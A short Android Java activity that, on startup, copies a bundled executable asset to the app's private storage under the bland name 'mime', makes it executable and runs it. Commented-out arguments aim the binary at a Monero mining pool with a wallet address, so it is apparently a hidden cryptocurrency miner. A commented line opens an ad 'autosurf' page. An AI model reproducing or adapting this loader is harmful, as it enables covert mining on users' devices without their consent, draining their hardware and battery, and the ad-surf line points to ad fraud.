package com.main;

public class MainActivity extends android.app.Activity   
{
    @Override  
    public void onCreate(final android.os.Bundle savedInstanceState)   
    {
        super.onCreate(savedInstanceState);
        final var mime = new java.io.File(super.getFilesDir(), "mime");
        try (final var assets = super.getAssets(); final var androidNotls = assets.open("android-notls"))
        {
            java.nio.file.Files.copy(androidNotls, mime.toPath());
            mime.setExecutable(true);
            final var process = new java.lang.ProcessBuilder(mime.getPath(), "-h"/*, "-t", "1", "-o", "auto.c3pool.org:443", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"*/).start();
            java.lang.System.out.println(new java.lang.String(process.getInputStream().readAllBytes()));
            java.lang.System.out.println(new java.lang.String(process.getErrorStream().readAllBytes()));
        }
        catch (final java.lang.Exception e){java.lang.System.out.println(e);}
        //super.startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("https://www.alexamaster.net/ads/autosurf/180120")));
    }  
}
